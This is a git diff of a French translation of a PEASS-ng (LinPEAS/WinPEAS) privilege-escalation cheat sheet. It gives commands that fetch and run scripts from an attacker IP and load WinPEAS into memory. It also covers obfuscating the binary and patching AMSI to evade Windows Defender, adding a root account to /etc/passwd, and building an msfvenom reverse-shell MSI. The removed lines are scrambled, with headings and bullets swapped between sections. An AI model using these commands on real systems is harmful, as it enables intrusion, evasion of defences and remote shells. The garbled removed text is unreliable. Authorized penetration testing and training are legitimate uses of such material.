@@ -1,12 +1,16 @@
-# 🦹 PEASS-ng — fiche pratique complète
-
 <!-- language-home-navigation -->
-[🏠 Accueil en français](../../README.fr.md) • [🌐 Languages](../../README.md#-available-languages)
+[🏠 Page d'accueil Française](../../README.fr.md) • [🌐 Languages](../../README.md#-available-languages)
 
-[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)
+[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇮🇹 Italiano](README.it.md)
+
+[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)
+
+---
 
 
+# 🦹 PEASS-ng (LinPEAS & WinPEAS) - Aide-mémoire complet
 
+[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
 ```
   ██████╗ ███████╗ █████╗ ███████╗███████╗      ███╗   ██╗ ██████╗ 
   ██╔══██╗██╔════╝██╔══██╗██╔════╝██╔════╝      ████╗  ██║██╔════╝ 
@@ -16,16 +20,15 @@
   ╚═╝     ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝      ╚═╝  ╚═══╝ ╚═════╝ 
              LinPEAS & WinPEAS Privilege Escalation Suite
 ```
-
 <p align="center">
   <img src="https://img.shields.io/badge/PEASS--ng-PrivEsc-red?style=for-the-badge" alt="PEASS-ng">
   <img src="https://img.shields.io/badge/LinPEAS-Linux_PrivEsc-blue?style=for-the-badge" alt="LinPEAS">
   <img src="https://img.shields.io/badge/WinPEAS-Windows_PrivEsc-orange?style=for-the-badge" alt="WinPEAS">
-  <img src="https://img.shields.io/badge/Automated-Enumeration-green?style=for-the-badge" alt="Automated">
+  <img src="https://img.shields.io/badge/Automated-Enumeration-green?style=for-the-badge" alt="Automatisé">
 </p>
 
 <p align="center">
-  <b>🔍 The world's most popular automated privilege escalation tools for Linux and Windows systems</b>
+  <b>🔍 Les outils automatisés d'élévation de privilèges les plus populaires au monde pour les systèmes Linux et Windows</b>
 </p>
 
 ---
@@ -33,55 +36,54 @@
 ## 📋 Table des matières
 
 - [Introduction](#-introduction)
-- [Color Legend & How to Read Output](#-color-legend--how-to-read-output)
+- [Légende des couleurs et comment lire la sortie](#-color-legend--how-to-read-output)
 - [LinPEAS (Linux Privilege Escalation)](#-linpeas-linux-privilege-escalation)
-  - [Download & In-Memory Execution](#download--in-memory-execution)
-  - [Options et paramètres](#command-line-options)
-  - [Core Vectors Checked by LinPEAS](#core-vectors-checked-by-linpeas)
-  - [Stealth & AV Evasion](#stealth--av-evasion)
-- [WinPEAS (Windows Privilege Escalation)](#-winpeas-windows-privilege-escalation)
-  - [Cleartext passwords in `.bash_history`, configuration files (`wp-config.php`, `.env`), SSH keys (`id_rsa`), and memory dumps.](#execution-methods-exe-vs-bat)
-  - [WinPEAS is provided in multiple formats:](#running-winpeas-in-memory)
-  - [Running WinPEAS in Memory](#core-vectors-checked-by-winpeas)
-  - [5. **Credential Stores & Autologon:](#bypassing-windows-defender--amsi)
-- [Interpreting High-Priority Findings](#-interpreting-high-priority-findings)
-- [Référence rapide](#-quick-reference-table)
-- [Conseils et bonnes pratiques](#-tips--best-practices)
-- [Legal Disclaimer](#-legal-disclaimer)
-- [Ressources et références](#-resources)
+  - [Téléchargement et exécution en mémoire](#download--in-memory-execution)
+  - [Options de ligne de commande](#options de ligne de commande)
+  - [Vecteurs de base vérifiés par LinPEAS](#core-vectors-checked-by-linpeas)
+  - [Furtivité et évasion AV](#stealth--av-evasion)
+- [WinPEAS (Escalation de privilèges Windows)](#-winpeas-windows-privilege-escalation)
+  - [Méthodes d'exécution (.exe vs .bat)](#execution-methods-exe-vs-bat)
+  - [Exécuter WinPEAS en mémoire](#running-winpeas-in-memory)
+  - [Vecteurs de base vérifiés par WinPEAS](#core-vectors-checked-by-winpeas)
+  - [Contourner Windows Defender et AMSI](#bypassing-windows-defender--amsi)
+- [Interprétation des résultats hautement prioritaires](#-interprétation-des résultats-haute-prioritaires)
+- [Tableau de référence rapide](#-quick-reference-table)
+- [Conseils et bonnes pratiques](#-conseils--meilleures pratiques)
+- [Mentions légales](#-legal-disclaimer)
+- [Ressources](#-ressources)
 
 ---
 
-## 🎯 Introduction
+## 🎯Présentation
 
-**PEASS-ng** (Privilege Escalation Awesome Scripts SUITE - new generation), created by Carlos Polop, is the de-facto standard collection of automated auditing tools used to uncover privilege escalation vectors on compromised systems:
+**PEASS-ng** (Privilege Escalation Awesome Scripts SUITE - nouvelle génération), créé par Carlos Polop, est la collection standard de facto d'outils d'audit automatisés utilisés pour découvrir les vecteurs d'escalade de privilèges sur les systèmes compromis :
 
-- **LinPEAS**: An all-in-one Bash script that searches for misconfigurations, credentials, writable files, SUID binaries, kernel exploits, cron jobs, and containers on Linux/Unix systems.
-- **WinPEAS**: Available as a standalone compiled .NET binary (`winPEASany.exe`, `winPEASx64.exe`) and lightweight batch script (`winPEAS.bat`) for auditing Windows workstations, domain members, and servers.
+- **LinPEAS :** Un script Bash tout-en-un qui recherche les erreurs de configuration, les informations d'identification, les fichiers inscriptibles, les binaires SUID, les exploits du noyau, les tâches cron et les conteneurs sur les systèmes Linux/Unix.
+- **WinPEAS :** Disponible sous forme de binaire .NET compilé autonome (`winPEASany.exe`, `winPEASx64.exe`) et de script batch léger (`winPEAS.bat`) pour l'audit des postes de travail Windows, des membres de domaine et des serveurs.
 
 ---
 
-## 🎨 Color Legend & How to Read Output
+## 🎨 Légende des couleurs et comment lire la sortie
 
-The defining power of PEASS is its automated color rating system:
+Le pouvoir déterminant de PEASS est son système automatisé d’évaluation des couleurs :
 
-|Color|Significance|Meaning|
+| Couleur | Importance | Signification |
 |-------|--------------|---------|
-|🔴 **RED/YELLOW**|🚨 **CRITICAL (99% PrivEsc)**|Highly reliable privilege escalation vector. Must check immediately!|
-|🔴 **RED**|⚠️ **Interesting**|Unusual configuration, non-default setting, or credential candidate.|
-|🟡 **YELLOW**|ℹ️ **Informative**|Noticeable finding that might be part of an exploit chain.|
-|🔵 **CYAN / BLUE**|👥 **Context**|Users, groups, and standard system information.|
+| 🔴 **ROUGE/JAUNE** | 🚨 **CRITIQUE (99% PrivEsc)** | Vecteur d’élévation de privilèges hautement fiable. Il faut vérifier immédiatement ! |
+| 🔴 **ROUGE** | ⚠️ **Intéressant** | Configuration inhabituelle, paramètre autre que celui par défaut ou candidat aux informations d'identification. |
+| 🟡 **JAUNE** | ℹ️ **Informatif** | Découverte notable qui pourrait faire partie d’une chaîne d’exploitation. |
+| 🔵 **CYAN / BLEU** | 👥 **Contexte** | Utilisateurs, groupes et informations système standard. |
 
-> **Golden Rule:** Scroll directly to **RED/YELLOW** highlights first! If you see text with a yellow background and red letters, an exploit vector is almost guaranteed.
+> **Règle d'or :** Faites d'abord défiler directement jusqu'aux surbrillances **ROUGE/JAUNE** ! Si vous voyez du texte avec un fond jaune et des lettres rouges, un vecteur d'exploit est presque garanti.
 
 ---
 
-## 🐧 LinPEAS (Linux Privilege Escalation)
+## 🐧 LinPEAS (escalade des privilèges Linux)
 
-### Download & In-Memory Execution
+### Téléchargement et exécution en mémoire
 
-You rarely need to write `linpeas.sh` to disk. Execute it directly in memory using standard UNIX utilities:
-
+Vous avez rarement besoin d'écrire `linpeas.sh` sur le disque. Exécutez-le directement en mémoire à l'aide des utilitaires UNIX standards :
 ```bash
 # 1. From attacker Python web server directly into bash
 curl -L http://10.10.14.5:8000/linpeas.sh | sh
@@ -96,9 +98,7 @@ curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas
 ./linpeas.sh -a > /tmp/linpeas.txt
 less -r /tmp/linpeas.txt
 ```
-
-### Options et paramètres
-
+### Options de ligne de commande
 ```bash
 # Run all checks (including slower exhaustive searches)
 ./linpeas.sh -a
@@ -115,38 +115,36 @@ less -r /tmp/linpeas.txt
 # System information only
 ./linpeas.sh -s
 ```
+### Vecteurs de base vérifiés par LinPEAS
 
-### Core Vectors Checked by LinPEAS
-
-1. **Sudo Misconfigurations (`sudo -l`):**
-   - Commands runnable as root without password (`NOPASSWD`).
-   - Sudo token reuse / CVE-2021-3156 (Baron Samedit).
-2. **SUID / SGID Binaries:**
-   - Core Vectors Checked by LinPEAS
-3. **Linux Capabilities:**
-   - 1. **Sudo Misconfigurations (`sudo -l`):
-4. **Scheduled Tasks & Timers:**
-   - Sudo token reuse / CVE-2021-3156 (Baron Samedit).
-   - 2. **SUID / SGID Binaries:
-5. **Path & Environment Hijacking:**
-   - 3. **Linux Capabilities:
-6. **Kernel Exploitation:**
-   - 4. **Scheduled Tasks & Timers:
-7. **NFS Root Squashing:**
-   - Systemd timers (`systemctl list-timers`).
-8. **Credential Harvesting:**
-   - Writable directories in `$PATH`, relative command lookups in scripts.
+1. **Mauvaises configurations Sudo (`sudo -l`) :**
+   - Commandes exécutables en tant que root sans mot de passe (`NOPASSWD`).
+   - Réutilisation du token Sudo / CVE-2021-3156 (Baron Samedit).
+2. **Binaires SUID / SGID :**
+   - Binaires avec autorisations root (`chmod +s`). Références croisées avec **GTFOBins**.
+3. **Capacités Linux :**
+   - Binaires avec des capacités élevées comme `cap_setuid+ep` (par exemple, `python3`, `tar`, `perl`).
+4. **Tâches et minuteries planifiées :**
+   - Crontabs (`/etc/crontab`, `/var/spool/cron/*`) et scripts programmés inscriptibles.
+   - Minuteries Systemd (`systemctl list-timers`).
+5. **Détournement de chemin et d'environnement :**
+   - Répertoires inscriptibles dans `$PATH`, recherches de commandes relatives dans les scripts.
+6. **Exploitation du noyau :**
+   - Version du noyau vérifiée par rapport aux exploits connus (Dirty COW, Dirty Pipe, OverlayFS).
+7. **Écrasement de racine NFS :**
+   - Répertoires partagés montés avec `no_root_squash` dans `/etc/exports`.
+8. **Récolte d'informations d'identification :**
+   - Mots de passe en texte clair dans `.bash_history`, fichiers de configuration (`wp-config.php`, `.env`), clés SSH (`id_rsa`) et vidages de mémoire.
 
 ---
 
-## 🪟 WinPEAS (Windows Privilege Escalation)
+## 🪟 WinPEAS (augmentation des privilèges Windows)
 
-### Cleartext passwords in `.bash_history`, configuration files (`wp-config.php`, `.env`), SSH keys (`id_rsa`), and memory dumps.
+### Méthodes d'exécution (.exe vs .bat)
 
-WinPEAS is provided in multiple formats:
-- **`winPEASx64.exe` / `winPEASany.exe`**: Written in C#/.NET. Most comprehensive; performs deep registry, API, and credential checks.
-- **`winPEAS.bat`**: Plain batch script. Highly compatible with legacy Windows versions, requires no .NET dependencies, and evades certain static binary detections.
-
+WinPEAS est fourni sous plusieurs formats :
+- **`winPEASx64.exe` / `winPEASany.exe` :** Écrit en C#/.NET. Le plus complet ; effectue des vérifications approfondies du registre, de l'API et des informations d'identification.
+- **`winPEAS.bat` :** Script batch simple. Hautement compatible avec les anciennes versions de Windows, ne nécessite aucune dépendance .NET et évite certaines détections binaires statiques.
 ```cmd
 :: Run winPEAS binary with full color output
 winPEASx64.exe
@@ -157,39 +155,35 @@ winPEASx64.exe > C:\Windows\Temp\out.txt
 :: Fast check without heavy registry and file searches
 winPEASx64.exe quiet
 ```
+### Exécuter WinPEAS en mémoire
 
-### WinPEAS is provided in multiple formats:
-
-To avoid saving files to disk on audited workstations, load WinPEAS directly into PowerShell memory:
-
+Pour éviter d'enregistrer des fichiers sur disque sur les postes de travail audités, chargez WinPEAS directement dans la mémoire PowerShell :
 ```powershell
 # In-memory execution using Net.WebClient
 $pe = (New-Object System.Net.WebClient).DownloadData('http://10.10.14.5:8000/winPEASx64.exe')
 [System.Reflection.Assembly]::Load($pe)
 [winPEAS.Program]::Main("")
 ```
+### Vecteurs de base vérifiés par WinPEAS
 
-### Running WinPEAS in Memory
+1. **Autorisations de service et chemins non cités :**
+   - **Chemins de service non cités :** Chemins binaires de service avec des espaces et sans guillemets (`C:\Program Files\App\service.exe` -> l'attaquant place `C:\Program.exe`).
+   - **Autorisations de service faibles :** Utilisateurs non-administrateurs disposant de `SERVICE_ALL_ACCESS` ou `SERVICE_CHANGE_CONFIG`.
+2. **Piratage de DLL :**
+   - Services tentant de charger des DLL inexistantes à partir de répertoires accessibles en écriture par l'utilisateur.
+3. **ToujoursInstallerÉlevé :**
+   - Clés de registre `AlwaysInstallElevated = 1` permettant à tout utilisateur d'installer des packages MSI élevés avec `msiexec`.
+4. **Privilèges de jetons (SeImpersonate / SeAssignPrimaryToken) :**
+   - Exploitable via les exploits Potato (SweetPotato, GodPotato, PrintSpoofer) pour passer des comptes de service (`IIS APPPOOL`, `LOCAL SERVICE`) à `NT AUTHORITY\SYSTEM`.
+5. **Magasins d'informations d'identification et connexion automatique :**
+   - Mots de passe en texte clair dans le registre (`DefaultPassword` dans Winlogon).
+   - Connexions RDP enregistrées, informations d'identification Vault, blobs DPAPI, sessions PuTTY, mots de passe WiFi.
+6. **Fichiers de sauvegarde SAM et SYSTÈME :**
+   - Copies inscriptibles ou lisibles de `C:\Windows\Repair\SAM` ou `C:\Windows\System32\config\RegBack\SAM`.
 
-1. **Service Permissions & Unquoted Paths:**
-   - **Unquoted Service Paths**: Service binary paths with spaces and no quotes (`C:\Program Files\App\service.exe` -> attacker places `C:\Program.exe`).
-   - **Weak Service Permissions**: Non-admin users having `SERVICE_ALL_ACCESS` or `SERVICE_CHANGE_CONFIG`.
-2. **DLL Hijacking:**
-   - Core Vectors Checked by WinPEAS
-3. **AlwaysInstallElevated:**
-   - 1. **Service Permissions & Unquoted Paths:
-4. **Token Privileges (SeImpersonate / SeAssignPrimaryToken):**
-   - Exploitable via Potato exploits (SweetPotato, GodPotato, PrintSpoofer) to elevate from service accounts (`IIS APPPOOL`, `LOCAL SERVICE`) to `NT AUTHORITY\SYSTEM`.
-5. **Credential Stores & Autologon:**
-   - Services attempting to load non-existent DLLs from user-writable directories.
-   - 3. **AlwaysInstallElevated:
-6. **SAM & SYSTEM Backup Files:**
-   - 4. **Token Privileges (SeImpersonate / SeAssignPrimaryToken):
+### Contourner Windows Defender et AMSI
 
-### 5. **Credential Stores & Autologon:
-
-Saved RDP connections, Vault credentials, DPAPI blobs, PuTTY sessions, WiFi passwords.
-
+Windows Defender signale activement les versions compilées de `winPEASx64.exe`. Pour exécuter WinPEAS dans des environnements surveillés :
 ```powershell
 # 1. Obfuscate winPEAS binary using Invisibility / Donut or custom compiler
 # 2. Patch AMSI in PowerShell session before running in memory:
@@ -198,13 +192,12 @@ Saved RDP connections, Vault credentials, DPAPI blobs, PuTTY sessions, WiFi pass
 # 3. Alternatively, fall back to winPEAS.bat (often unflagged by AV):
 curl.exe http://10.10.14.5:8000/winPEAS.bat -o %TEMP%\wp.bat && %TEMP%\wp.bat
 ```
-
 ---
 
-## 🎯 Interpreting High-Priority Findings
+## 🎯 Interprétation des résultats hautement prioritaires
 
-### 1. LinPEAS: Writable `/etc/passwd`
-If LinPEAS marks `/etc/passwd` in **RED/YELLOW**:
+### 1. LinPEAS : écrit `/etc/passwd`
+Si LinPEAS marque `/etc/passwd` en **ROUGE/JAUNE** :
 ```bash
 # Generate password hash:
 openssl passwd -1 -salt evil SaltPass123
@@ -212,57 +205,54 @@ openssl passwd -1 -salt evil SaltPass123
 echo 'root2:$1$evil$TNy7V...:0:0:root:/root:/bin/bash' >> /etc/passwd
 su root2
 ```
-
-### 🎯 Interpreting High-Priority Findings
-If you hold `SeImpersonatePrivilege`:
+### 2. WinPEAS : `SeImpersonatePrivilege` présent
+Si vous détenez `SeImpersonatePrivilege` :
 ```powershell
 # Elevate instantly using GodPotato or PrintSpoofer:
 .\GodPotato-NET4.exe -cmd "cmd.exe /c whoami"
 ```
-
-### 3. WinPEAS: `AlwaysInstallElevated` Set to 1
+### 3. WinPEAS : `AlwaysInstallElevated` défini sur 1
 ```powershell
 # Generate malicious MSI payload:
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f msi -o priv.msi
 # Run installer as low-privileged user:
 msiexec /quiet /qn /i priv.msi
 ```
-
 ---
 
-## 📊 Référence rapide
+## 📊 Tableau de référence rapide
 
-|Target|Commande|Objectif|
+| Cible | Commande | Objectif |
 |--------|---------|---------|
-|**Linux (Remote)**|`curl -L http://<IP>/linpeas.sh \|sh`|In-memory execution without touching disk|
-|**Linux (Local)**|`./linpeas.sh -a > out.txt`|Complete audit saved to text file|
-|**Linux (Fast)**|`./linpeas.sh -q`|Fast scan skipping slow file searches|
-|**Windows (CLI)**|`winPEASx64.exe quiet`|Fast execution with reduced noise|
-|**Windows (Memory)**|`[System.Reflection.Assembly]::Load($pe)`|Load .NET binary in memory via PowerShell|
-|**Windows (Batch)**|`winPEAS.bat`|Dependency-free execution for legacy/AV evasion|
+| **Linux (à distance)** | `curl -L http://<IP>/linpeas.sh \| sh` | Exécution en mémoire sans toucher au disque |
+| **Linux (local)** | `./linpeas.sh -a > out.txt` | Audit complet enregistré dans un fichier texte |
+| **Linux (rapide)** | `./linpeas.sh -q` | Analyse rapide en ignorant les recherches de fichiers lentes |
+| **Windows (CLI)** | `winPEASx64.exe quiet` | Exécution rapide avec un bruit réduit |
+| **Windows (Mémoire)**| `[System.Reflection.Assembly]::Load($pe)` | Charger le binaire .NET en mémoire via PowerShell |
+| **Windows (par lots)** | `winPEAS.bat` | Exécution sans dépendance pour l'évasion héritée/AV |
 
 ---
 
 ## 💡 Conseils et bonnes pratiques
 
-1. **Review Output Using `less -r`:**
-   When redirecting output to a file (`./linpeas.sh > linpeas.txt`), always view it using `less -r linpeas.txt` or `cat linpeas.txt` so terminal ANSI color escape codes render properly.
-2. **Transfer via Port 80/443:**
-   When staging LinPEAS or WinPEAS on your attacker box, host your web server on port `80` or `443` using `python3 -m http.server 80` to bypass strict target firewall egress rules.
-3. **Don't Overlook Hidden Credentials:**
-   Check the "Interesting Files" and "Cloud Credentials" sections of LinPEAS output; often plain-text API tokens or AWS credentials grant higher privileges than a local exploit.
+1. **Examiner le résultat à l'aide de `less -r` :**
+   Lorsque vous redirigez la sortie vers un fichier (`./linpeas.sh > linpeas.txt`), affichez-la toujours en utilisant `less -r linpeas.txt` ou `cat linpeas.txt` afin que les codes d'échappement de couleur ANSI du terminal s'affichent correctement.
+2. **Transfert via le port 80/443 :**
+   Lors de la préparation de LinPEAS ou WinPEAS sur la machine de votre attaquant, hébergez votre serveur Web sur le port `80` ou `443` à l'aide de `python3 -m http.server 80` pour contourner les règles strictes de sortie du pare-feu cible.
+3. **Ne négligez pas les informations d'identification cachées :**
+   Vérifiez les sections « Fichiers intéressants » et « Credentials Cloud » de la sortie LinPEAS ; souvent, les jetons API en texte brut ou les informations d'identification AWS accordent des privilèges plus élevés qu'un exploit local.
 
 ---
 
-## ⚠️ Legal Disclaimer
+## ⚠️ Mentions légales
 
-> **IMPORTANT:** PEASS-ng scripts perform comprehensive internal auditing and configuration discovery. They must only be executed on systems where you have documented permission during authorized penetration tests, CTF exercises, or internal security audits.
+> **IMPORTANT :** Les scripts PEASS-ng effectuent un audit interne complet et une découverte de configuration. Ils ne doivent être exécutés que sur des systèmes pour lesquels vous disposez d'une autorisation documentée lors de tests d'intrusion autorisés, d'exercices CTF ou d'audits de sécurité internes.
 
 ---
 
-## 📚 Ressources et références
+## 📚 Ressources
 
-- [PEASS-ng Official GitHub Repository](https://github.com/carlospolop/PEASS-ng)
-- [HackTricks Cloud & Privilege Escalation Bible](https://book.hacktricks.xyz/)
-- [GTFOBins - Unix Binaries Exploitation](https://gtfobins.github.io/)
-- [LOLBAS - Windows Living Off The Land](https://lolbas-project.github.io/)
+- [Dépôt GitHub officiel PEASS-ng](https://github.com/carlospolop/PEASS-ng)
+- [Bible HackTricks Cloud et escalade de privilèges](https://book.hacktricks.xyz/)
+- [GTFOBins - Exploitation des binaires Unix](https://gtfobins.github.io/)
+- [LOLBAS - Windows vivant de la terre](https://lolbas-project.github.io/)
